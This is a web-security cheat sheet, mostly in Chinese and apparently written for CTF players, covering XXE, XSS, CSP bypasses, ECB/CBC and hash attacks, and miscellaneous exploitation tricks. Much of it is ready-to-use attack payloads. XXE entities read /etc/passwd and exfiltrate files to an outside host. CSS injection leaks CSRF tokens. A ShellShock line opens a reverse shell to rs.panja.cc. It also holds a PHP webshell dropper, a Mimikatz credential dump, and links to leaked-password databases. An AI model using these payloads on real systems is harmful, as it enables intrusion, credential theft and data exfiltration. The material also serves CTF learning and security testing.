https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit

Testing Payload:

https://github.com/cujanovic/SSRF-Testing


# XXE

## 内部实体

```xml
<!DOCTYPE kaibro[
    <!ENTITY param "hello">
]>
<root>&param;</root>
```

## 外部实体

- `libxml2.9.0`以后，预设不解析外部实体
- `simplexml_load_file()`旧版本中预设解析实体，但新版要指定第三个参数`LIBXML_NOENT`
- `SimpleXMLElement` is a class in PHP
    - http://php.net/manual/en/class.simplexmlelement.php

```xml
<!DOCTYPE kaibro[
    <!ENTITY xxe SYSTEM "http://rs.panja.cc/xxe.txt">
]>
<root>&xxe;</root>
```

```xml
<!DOCTYPE kaibro[
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### XXE on Windows

```xml
<!DOCTYPE kaibro[
    <!ENTITY xxe SYSTEM "\\12.34.56.78">
]>
<root>&xxe;</root>
```

## 参数实体

```xml
<!DOCTYPE kaibro[
    <!ENTITY % remote SYSTEM "http://rs.panja.cc/xxe.dtd">
    %remote;
]>
<root>&b;</root>
```
xxe.dtd: `<!ENTITY b SYSTEM "file:///etc/passwd">`


## Out of Band (OOB) XXE

- Blind 无回显

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/xxe/test.php">
<!ENTITY % remote SYSTEM "http://rs.panja.cc/xxe.dtd">
%remote;
%all;
%send;
]>
```

xxe.dtd:

```xml
<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://rs.panja.cc/?a=%file;'>">
```

## DoS

- Billion Laugh Attack

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

## 其它

- DOCX
- XLSX
- PPTX
- PDF
- https://github.com/BuffaloWill/oxml_xxe

# XSS

## Basic Payload

- `<script>alert(1)</script>`
- `<svg/onload=alert(1)>`
- `<img src=# onerror=alert(1)>`
- `<a href="javascript:alert(1)">g</a>`
- `<input type="text" value="g" onmouseover="alert(1)" />`
- `<iframe src="javascript:alert(1)"></iframe>`
- ...

## Testing

- `<script>alert(1)</script>`
- `'"><script>alert(1)</script>`
- `<img/src=@ onerror=alert(1)/>`
- `'"><img/src=@ onerror=alert(1)/>`
- `' onmouseover=alert(1) x='`
- `" onmouseover=alert(1) x="`
- ``` `onmouseover=alert(1) x=` ```
- `javascript:alert(1)//`
- `{}@import"//innerht.ml?`
- `{}%0a@import"//innerht.ml?`
- ....

## 绕过

- `//`(javascript注解)被过滤时，可以利用算数运算符代替
    - `<a href="javascript:alert(1)-abcde">xss</a>`
- HTML特性
    - 不分大小写
        - `<ScRipT>`
        - `<img SrC=#>`
    - 属性值
        - `src="#"`
        - `src='#'`
        - `src=#`
        - ```src=`#` ``` (IE)
- 编码绕过
    - `<svg/onload=alert(1)>`
        - `<svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>` (16进制) (分号可去掉)
- 绕空白
    - `<img/src='1'/onerror=alert(0)>`
## 其他

- 特殊标签
    - 以下标签中的脚本无法执行
    - `<title>`, `<textarea>`, `<iframe>`, `<plaintext>`, `<noscript>`...

- 伪协议
    - javascript:
        - `<a href=javascript:alert(1) >xss</a>`
    - data:
        - `<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>xss</a>`
- Javascript自解码机制
    - `<input type="button" onclick="document.write('&lt;img src=@ onerror=alert(1) /&gt;')" />`
    - 会成功`alert(1)`，因为javascript位于HTML中，在执行javascript前会先解码HTML编码
    - 但若是包在`<script>`中的javascript，不会解码HTML编码
    - 此编码为HTML entity和`&#xH;`(hex), `&#D;`(dec)形式

- Javascript中有三套编码/解码函数
    - escape/unescape
    - encodeURI/decodeURI
    - encodeURIComponent/decodeURICompinent

- 一些alert(document.domain)的方法
    - `(alert)(document.domain);`
    - `al\u0065rt(document.domain);`
    - `al\u{65}rt(document.domain);`
    - `window['alert'](document.domain);`
    - `alert.call(null,document.domain);`
    - `alert.bind()(document.domain);`
    - https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309

- Some Payload
    - `<svg/onload=alert(1);alert(2)>`
    - `<svg/onload="alert(1);alert(2)">`
    - `<svg/onload="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;;alert(2)">`
        - `;;`改成`;`会失败
        - 双引号可去掉
        - 可10进制, 16进制混合
    - `<svg/onload=\u0061\u006c\u0065\u0072\u0074(1)>`
        - \u形式只能用在javascript，例如onload的a改成\u0061会失败
    - `<title><a href="</title><svg/onload=alert(1)>`
        - title优先权较大，直接中断其他标籤
    - `<svg><script>prompt&#40;1)</script>`
        - 因为`<svg>`，HTML Entities会被解析
        - 去掉`<svg>`会失败，`<script>`不会解析Entities
    - `<? foo="><script>alert(1)</script>">`
    - `<! foo="><script>alert(1)</script>">`
    - `</ foo="><script>alert(1)</script>">`
    - `<% foo="><script>alert(1)</script>">`

- Markdown XSS
    - `[a](javascript:prompt(document.cookie))`
    - `[a](j a v a s c r i p t:prompt(document.cookie))`
    - `[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)`
    - `[a](javascript:window.onerror=alert;throw%201)`
    - ...

- 文件XSS
    - Example: PlaidCTF 2018 wave XSS
    - 上传.wave档 (会检查signatures)
      ```
        RIFF`....WAVE...` 
        alert(1); 
        function RIFF(){}
      ```
        - 变成合法的js语法
        - wave在apache mime type中没有被定义
        - `<script src="uploads/this_file.wave">`

## CSP evaluator

https://csp-evaluator.withgoogle.com/

## Bypass CSP

- base
    - 改变资源载入的域，引入恶意的js
    - `<base href ="http://rs.panja.cc/">`
    - RCTF 2018 - rBlog

- script nonce
    
    ```
     <p>可控内容<p>
     <script src="xxx" nonce="AAAAAAAAAAA"></script>
    ```

    插入`<script src="http//rs.panja.cc/uccu.js" a="`

    ```
     <p><script src="http//rs.panja.cc/uccu.js" a="<p>
     <script src="xxx" nonce="AAAAAAAAAAA"></script>
    ```

- Script Gadget
    - https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
    - is an **existing** JS code on the page that may be used to bypass mitigations
    - Bypassing CSP strict-dynamic via Bootstrap
        - `<div data-toggle=tooltip data-html=true title='<script>alert(1)</script>'></div>`
    - Bypassing sanitizers via jQuery Mobile
        - `<div data-role=popup id='--><script>alert(1)</script>'></div>`
    - Bypassing NoScript via Closure (DOM clobbering)
        - `<a id=CLOSURE_BASE_PATH href=http://attacker/xss></a>`
    - Bypassing ModSecurity CRS via Dojo Toolkit
        - `<div data-dojo-type="dijit/Declaration" data-dojo-props="}-alert(1)-{">`
    - Bypassing CSP unsafe-eval via underscore templates
        - `<div type=underscore/template> <% alert(1) %> </div>`
    - 0CTF 2018 - h4xors.club2
- google analytics ea
    - ea is used to log actions and can contain arbitrary string
    - Google CTF 2018 - gcalc2


## Online Encoding / Decoding
- http://monyer.com/demo/monyerjs/

## JSFuck
- http://www.jsfuck.com/

## aaencode / aadecode
- http://utf-8.jp/public/aaencode.html
- https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html


## RPO

- http://example.com/a%2findex.php
    - 浏览器会把`a%2findex.php`当成一个档案
    - Web Server则会正常解析成`a/index.php`
    - 所以当使用**相对路径**载入css时，就可以透过这种方式让浏览器解析到其他层目录下的档案
        - 如果该档案内容可控，则有机会XSS
    - 举例： 
        - `/test.php`中有`<link href="1/" ...>`
        - 另有`/1/index.php`给`?query=`参数，会直接输出该参数内容
        - 访问`/1%2f%3Fquery={}*{background-color%3Ared}%2f..%2f../test.php`就会让背景变红色
            - Server: `/test.php`
            - Browser: `/1%2f%3Fquery={}*{background-color%3Ared}%2f..%2f../test.php`
                - CSS会载入`/1/?query={}*{background-color:red}/../../1/`
            - CSS语法容错率很高

## CSS Injection

- CSS可控時，可以Leak Information
- Example:
    - leak `<input type='hidden' name='csrf' value='2e3d04bf...'>`
    - `input[name=csrf][value^="2"]{background: url(http://kaibro.tw/2)}`
    - `input[name=csrf][value^="2e"]{background: url(http://kaibro.tw/2e)}`
    - ...
    - SECCON CTF 2018 - GhostKingdom

# 密码学

## PRNG

- php 7.1.0后 `rand()`和`srand()`已经等同`mt_rand()`和`mt_srand()`
    - 测试结果：https://3v4l.org/PIUEo

- php > 4.2.0 会自动对`srand()`和`mt_srand()`播种
    - 只进行一次seed，不会每次`rand()`都seed
    
- 可以通过已知的random结果，去推算随机数种子，然后就可以推算整个随机数序列
- 实际应用上可能会碰到连上的不是同个process，可以用`Keep-Alive
`来确保连上同个php process(只会seed一次)
- 7.1以前`rand()`使用libc random()，其核心为：`
state[i] = state[i-3] + state[i-31]`
    - 所以只要有31个连续随机数就能预测接下来的随机数
    - 后来`rand()` alias成`mt_rand()`，採用的是`Mersenne Twister`算法
- Example: HITCON 2015 - Giraffe’s Coffee


## ECB mode

### Cut and Paste Attack

- 每个Block加密方式都一样，所以可以把Block随意排列
- 举例： `user=kaibro;role=user`
    - 假设Block长度为8
    - 构造一下user: (`|`用来区分Block)
        - `user=aaa|admin;ro|le=user`
        - `user=aaa|aa;role=|user`
    - 排列一下：(上面每块加密后的Block都已知)
        - `user=aaa|aa;role=|admin;ro`
- Example: AIS3 2017 pre-exam

### Encryption Oracle Attack

- `ECB(K, A + B + C)`的运算结果可知
    - B可控
    - K, A, C未知
- C的内容可以透过以下方法爆出来：
    - 找出最小的长度L
    - 使得将B改成L个a，该段pattern刚好重复两次
        - `...bbbb bbaa aaaa aaaa cccc ...`
        - `...???? ???? 5678 5678 ???? ...`
    - 改成L-1个a，可得到`ECB(K, "aa...a" + C[0])`这个Block的内容
    - C[0]可爆破求得，后面也依此类推
- 常见发生场景：Cookie

## CBC mode

### Bit Flipping Attack

- 假设IV为A、中间值为B (Block Decrypt后结果)、明文为C
- CBC mode解密时，`A XOR B = C`
- 若要使输出明文变`X`
- 修改A为`A XOR C XOR X`
- 则原本式子变成`(A XOR C XOR X) XOR B = X`

### Padding Oracle Attack

- `PKCS#7`
    - Padding方式：不足x个Byte，就补x个x
        - 例如：Block长度8
        - `AA AA AA AA AA AA AA 01`
        - `AA AA AA AA AA AA 02 02`
        - `AA AA AA AA AA 03 03 03`
        - ...
        - `08 08 08 08 08 08 08 08`
    - 在常见情况下，如果解密出来发现Padding是烂的，会喷Exception或Error
        - 例如：HTTP 500 Internal Server Error
        - 须注意以下这类情况，不会喷错：
            - `AA AA AA AA AA AA 01 01`
            - `AA AA 02 02 02 02 02 02`
- 原理：
    - CBC mode下，前一块密文会当作当前这块的IV，做XOR
    - 如果构造`A||B`去解密 (A, B是密文Block)
    - 此时，A会被当作B的IV，B会被解成`D(B) XOR A`
    - 可以透过调整A，使得Padding变合法，就可以得到`D(B)`的值
        - 例如：要解最后1 Byte
        - 想办法让最后解出来变成`01`结尾
        - 运气不好时，可能刚好碰到`02 02`结尾，可以调整一下A倒数第2 Byte
        - `D(B)[-1] XOR A[-1] = 01`
        - `D(B)[-1] = A[-1] XOR 01`
        - 有最后1 Byte就可以依此类推，调整倒数第2 Byte
    - `D(B) XOR C`就能得到明文 (C为前一块真正的密文)



## Length Extension Attack

- 很多hash算法都可能存在此攻击，例如`md5`, `sha1`, `sha256`...
- 主要是因为他们都使用Merkle-Damgard hash construction
- 会依照64 Byte分组，不足会padding
    - 1 byte的`0x80`+一堆`0x00`+8 bytes的`长度`
- IV是写死的，且每一组输出结果会当下一组的输入
- 攻击条件： (这里md5换成sha1, sha256...也通用)
    - 已知`md5(secret+message)`
    - 已知`secret长度`
    - 已知`message内容`
- 符合三个条件就能构造`md5(secret+message+padding+任意字符串)`
- 工具 - hashpump
    - 基本用法：
        1. 输入`md5(secret+message)`的值
        2. 输入`message`的值
        3. 输入`secert长度`
        4. 输入要加在后面的字符串
        5. 最后会把`md5(secret+message+padding+任意字符串)`和`message+padding+任意字符串`喷给你


# 其它

 - Information leak
     - .git / .svn
     - robots.txt
     - /.well-known
     - .DS_Store
     - .htaccess
     - .pyc
     - server-status
     - crossdomain.xml
     - admin/ manager/ login/ backup/ wp-login/ phpMyAdmin/
     - xxx.php.bak / www.tar.gz / .xxx.php.swp / xxx.php~ / xxx.phps
     - /WEB-INF/web.xml
 - 文件解析漏洞
     - Apache
         - shell.php.ggininder
         - shell.php%0a
            - httpd 2.4.0 to 2.4.29
            - CVE-2017-15715
     - IIS
         - IIS < 7
             - a.asp/user.jpg
             - user.asp;aa.jpg
     - Nginx
         - nginx < 8.03
             - `cgi.fix_pathinfo=1`
             - Fast-CGI开启状况下
             - kaibro.jpg: `<?php fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>`
             - 访问`kaibro.jpg/.php`生成shell.php

- AWS常见漏洞
    - S3 bucket权限配置错误
        - nslookup判断
            - `nslookup 87.87.87.87`
            - `s3-website-us-west-2.amazonaws.com.`
        - 确认bucket
            - 访问`bucketname.s3.amazonaws.com`
            - 成功会返回bucket XML信息
        - awscli工具
            - 列目录 `aws s3 ls s3://bucketname/ --region regionname`
            - 下载 `aws sync s3://bucketname/ localdir --region regionname`
    - metadata
        - http://169.254.169.254/latest/meta-data/
        - Tool 
            - https://andresriancho.github.io/nimbostratus/

- 常见Port服务
    - http://packetlife.net/media/library/23/common_ports.pdf
- `php -i | grep "Loaded Configuration File"`
    
    - 列出php.ini路径

- `curl -i -X OPTIONS 'http://evil.com/'`

- ShellShock
    
    - `() { :; }; echo vulnerable`
    - `() { :a; }; /bin/cat /etc/passwd`
    - `() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/rs.panja.cc/1234 0>&1'`

- X-forwarded-for伪造来源IP

- DNS Zone Transfer
    - `dig @1.2.3.4 abc.com axfr`
        - DNS Server: `1.2.3.4`
        - Test Domain: `abc.com`

- NodeJS unicode failure
    - 内部使用UCS-2编码
    - `ＮＮ` => `..`
        - `Ｎ` 即 `\xff\x2e`
        - 转型时舍弃第一个Byte

- 特殊的CRLF Injection绕过
    - `%E5%98%8A`
    - 原始的Unicode码为`U+560A`
    - raw bytes: `0x56`, `0x0A`

- MySQL utf8 v.s. utf8mb4
    - MySQL utf8编码只支持3 bytes
    - 若将4 bytes的utf8mb4插入utf8中，在non strict模式下会被截断
    - CVE-2015-3438 WordPress Cross-Site Scripting Vulnerability

- Nginx目录穿越漏洞
    - 常见于Nginx做Reverse Proxy的状况
    ```
    location /files {
        alias /home/
    }
    ```
    - 因为`/files`没有加上结尾`/`，而`/home/`有
    - 所以`/files../`可以访问上层目录

- Node.js目录穿越漏洞
    - CVE-2017-14849
    - 影响: 8.5.0版
    - `/static/../../../foo/../../../../etc/passwd`

- Apache Tomcat Session操纵漏洞
    - 预设session范例页面`/examples/servlets /servlet/SessionExample`
    - 可以直接对Session写入

- polyglot image+.htaccess
    - XBM格式有定義在`exif_imagetype()`中
    - 符合`.htaccess`格式
    - Insomnihack CTF
    ```
    #define gg_width 1337
    #define gg_height 1337
    AddType application/x-httpd-php .asp
    ```

- tcpdump
    - `-i` 指定网卡，不指定则监控所有网卡
    - `-s` 默认只抓96bytes，可以-s指定更大数值
    - `-w` 指定输出档
    - `host` 指定主机(ip or domain)
    - `dst`, `src` 来源或目的端
    - `port`指定端口
    - `tcp`, `udp`, `icmp` 指定协议
    - example
        - 来源192.168.1.34且目的端口为80
            - `tcpdump -i eth0 src 192.168.1.34 and dst port 80`
        - 来源192.168.1.34且目的端口是22或3389
            - `tcpdump -i eth0 'src 192.168.1.34 and (dst port 22 or 3389)'`
        - 保存档案，可以后续用wireshark分析
            - `tcpdump -i eth0 src rs.panja.cc -w file.cap`



# Tool & Online Website

## Information gathering

- http://pentest-tools.com/

- https://www.shodan.io/

- https://www.zoomeye.org/

- https://censys.io

- https://crt.sh/

- http://webscan.cc/

- https://x.threatbook.cn/

- https://dnsdumpster.com/

- https://www.domainiq.com/reverse_whois

- https://www.yougetsignal.com/tools/web-sites-on-web-server/

- https://www.robtex.com/dns-lookup/

- https://phpinfo.me/bing.php

- https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project

- https://github.com/laramies/theHarvester

- https://github.com/drwetter/testssl.sh

- https://github.com/urbanadventurer/WhatWeb

- https://buckets.grayhatwarfare.com/

## Social Engineering

- https://leakedsource.ru/

- https://www.shuju666.com/

- http://www.pwsay.com/

- http://www.mimayun.club/

- http://leakbase.pw

- https://haveibeenpwned.com/

## Crack

- http://cmd5.com

- https://somd5.com/

- https://crackstation.net/

- https://hashkiller.co.uk/

## 其它

- https://3v4l.org/
    - php eval

- https://github.com/denny0223/scrabble
    - git

- https://github.com/lijiejie/ds_store_exp
    - .DS_Store 

- https://github.com/kost/dvcs-ripper
    - git / svn / hg / cvs ...

- http://www.factordb.com/

- unicode converter
    - https://www.branah.com/unicode-converter

- PHP混淆 / 加密
    - http://enphp.djunny.com/
    - http://www.phpjm.net/

- https://github.com/PowerShellMafia/PowerSploit

- https://github.com/swisskyrepo/PayloadsAllTheThings/

- http://xssor.io

- https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt
    - XSS Payloads

- DNSLog
    - http://ceye.io
    - https://www.t00ls.net/dnslog.html
    - http://dnsbin.zhack.ca/

- https://r12a.github.io/apps/encodings/
    - Encoding converter 

- http://tool.leavesongs.com/

- Mimikatz
    - `mimikatz.exe privilege::debug sekurlsa::logonpasswords full exit >> log.txt`

- WASM
    - https://wasdk.github.io/WasmFiddle/

----

# Contributing

Welcome to open Pull Request

OR

[![Buy me a coffee](https://www.buymeacoffee.com/assets/img/custom_images/black_img.png)](https://www.buymeacoffee.com/b4wKcIZ)


